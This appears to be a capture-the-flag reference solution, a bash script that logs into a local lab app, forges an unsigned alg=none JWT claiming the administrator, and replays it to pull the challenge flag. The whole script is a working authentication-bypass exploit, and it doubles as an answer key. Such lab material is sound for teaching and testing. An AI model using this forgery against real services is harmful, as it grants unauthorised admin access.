#!/usr/bin/env bash
# Reference solution for challenge 01: JWT forgery via an unsigned token.
#
#   1. sign in with the low-privilege account and capture the session cookie
#   2. confirm the admin area refuses that genuine token
#   3. forge a token whose header says alg=none, with sub=administrator
#   4. replay it and read the trade pricing key
set -euo pipefail
BASE="${BASE:-http://127.0.0.1:8801}"
ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
# shellcheck source=../../_shared/tools/http.sh
source "$ROOT/_shared/tools/http.sh"
FORGE="$ROOT/_shared/tools/forge.py"
JAR="$(mktemp)"; trap 'rm -f "$JAR"' EXIT

echo "== 1. sign in as the low-privilege account =="
"${HTTP[@]}" -c "$JAR" -o /dev/null -X POST \
  -d 'username=wiener&password=peter' "$BASE/login"
TOKEN=$(awk '/session/{print $7}' "$JAR")
echo "   session cookie captured (${#TOKEN} bytes)"

echo
echo "== 2. replay the genuine token against /admin =="
"${HTTP[@]}" -b "$JAR" -o /dev/null -w '   HTTP %{http_code}\n' "$BASE/admin"

echo
echo "== 3. forge an unsigned token claiming to be the administrator =="
FORGED=$(python3 "$FORGE" --alg none --sub administrator --original "$TOKEN" | tail -1)

echo
echo "== 4. replay the forged token against /admin =="
"${HTTP[@]}" -H "Cookie: session=$FORGED" "$BASE/admin" | grep -oE 'G24\{[^}]+\}' | head -1
